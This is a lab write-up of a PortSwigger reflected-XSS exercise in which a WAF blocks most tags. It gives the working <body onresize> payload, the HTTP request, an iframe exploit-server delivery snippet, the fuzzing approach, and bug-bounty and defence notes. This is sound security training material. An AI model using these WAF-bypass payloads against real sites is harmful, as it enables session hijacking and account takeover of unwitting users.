# LAB: Reflected XSS into HTML context with most tags and attributes blocked

|                             |                                                                                                                                 |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| **Topic**                   | Cross-site scripting (XSS)                                                                                                    |
| **Difficulty**              | Practitioner                                                                                                                   |
| **Date**                    | 2026-11-24                                                                                                                     |
| **Time**                    |          45                                                                                                                  |
| **Solved without solution** | yes                                                                                                                             |
| **Link**                    | [lab-html-context-with-most-tags-and-attributes-blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked) |

## 1. Objective

Perform a Reflected Cross-Site Scripting (XSS) attack on a search feature protected by a Web Application Firewall (WAF) that blocks most HTML tags and attributes, bypassing the filters to execute `print()`.

## 2. Surface

- URL query parameter (`/search?search=...`).
- Server-side Web Application Firewall (WAF) filtering incoming HTML tags and attributes.
- HTML reflection context: User input reflected directly into the page response body.

## 3. Hypothesis

If a WAF blocks common HTML tags and event handlers using strict blacklists or regex filters, fuzzing allowed tags and events will identify unblocked primitives. Combining an allowed tag (such as `<body` or `<custom-tag>`) with an allowed event handler (`onresize`, `onfocus`, etc.) will enable client-side code execution when automatically triggered.

## 4. Payload that worked

Request:
```http
GET /?search=%3Cbody+onresize%3D%22print%28%27Carregado%27%29%22%3E%09onresize%09%3C%2Fbody%3E%3E%27 HTTP/2
Host: <host>.web-security-academy.net
Cookie: session=sess
Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: iframe
Sec-Fetch-Storage-Access: active
Referer: https://exploit-0ad700e4034ce8eb80bc113a01d20098.exploit-server.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

....
<iframe src="https://<host>.web-security-academy.net/?search=%3Cbody+onresize%3D%22print%28%%27%29%22%3E%09onresize%09%3C%2Fbody%3E>'" onload="this.style.width = '100%'"></iframe>

```
Response:
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 3554
...
<section class=blog-header>
  <h1>0 search results for '<body onresize="print()">	onresize	</body>>''</h1>
  <hr>
</section>

```
## 5. Why it works

Auditing the server-side Web Application Firewall (WAF) using automated tag and attribute fuzzing revealed a restrictive blocklist with precise whitelist exceptions:
- **Allowed Tag:** `<body>`
- **Allowed Event Handler:** `onresize`

Because `body` and `onresize` are permitted by the perimeter filters, injecting `<body onresize=print()>` into the reflected search query reflects valid, executable HTML markup into the response body. 

However, triggering `onresize` on a victim's client without direct interaction requires automating the viewport dimension change. To achieve this via an exploit server payload:
1. An `<iframe>` is loaded on the attacker-controlled page, referencing the vulnerable lab search URL with the payload embedded in the query string.
2. The `<iframe>` includes an `onload` handler that dynamically adjusts its dimensions to `100%` width/height upon loading.
3. The sudden layout recalculation forces a DOM window resize event inside the framed context, automatically executing `print()` without requiring the victim to manually resize their browser window.

## 6. What I tried that failed

- Fuzzing standard HTML tags (`<script>`, `<img>`, `svg`, `iframe`, etc.) against the search parameter resulted in HTTP 400/403 responses, confirming a heavy tag blocklist.
- Fuzzing standard event handlers (`onload`, `onerror`, `onclick`, `onmouseover`) was blocked across all test tags.
- Constructing the initial payload `<body onresize=print()>` worked manually when toggling or maximizing the browser window, but failed to solve the lab automatically when delivered via a static `<iframe>` without dynamic sizing logic.
- Rule extracted: When a WAF forces reliance on interaction-dependent event handlers like `onresize`, exploit delivery via an `<iframe>` requires forcing a layout recalculation (e.g., changing width/height dynamically on load) to simulate the required window event automatically.

## 7. In a real target (bounty translation)

- Where it shows up: Main search inputs, filter parameters, and dynamic routing endpoints protected by restrictive WAF rules or custom input validation filters.
- Quick detection: Automated fuzzing of HTML tags and attribute lists using Burp Intruder/ffuf to determine WAF whitelist boundaries.
- Impact: Reflected XSS execution bypassing perimeter defenses, enabling session hijacking, malicious redirects, or victim action execution via automated vector delivery (e.g., via exploit server).
- In the report: Document the specific tags and attributes allowed by the WAF whitelist, supply the complete fuzzing results, demonstrate the automated execution vector, and detail the end-to-end exploit sequence.

## 8. Bypass / variants noticed

- Triggering `onresize` via CSS animations or CSS transitions applied to the container element to force continuous layout recalculations.
- Utilizing alternative frame-manipulation techniques, such as nesting multiple frames or toggling viewport zoom levels, to force client-side window resize events.

## 9. Takeaway

Blacklisting HTML tags and event handlers via WAF rules is inherently fragile. Robust defense against XSS requires proper contextual output encoding, strict Content Security Policy (CSP) implementation, and input validation based on strict allowlists rather than blocklists.
